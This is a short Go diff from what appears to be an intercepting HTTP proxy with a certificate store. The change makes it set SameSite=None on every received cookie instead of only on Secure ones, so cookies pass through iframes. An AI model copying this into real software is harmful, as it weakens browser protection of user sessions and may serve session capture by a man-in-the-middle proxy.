@@ -1120,9 +1120,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// parse cookie
 
 				// add SameSite=none for every received cookie, allowing cookies through iframes
-				if ck.Secure {
-					ck.SameSite = http.SameSiteNoneMode
-				}
+				ck.SameSite = http.SameSiteNoneMode
 
 				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
 					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
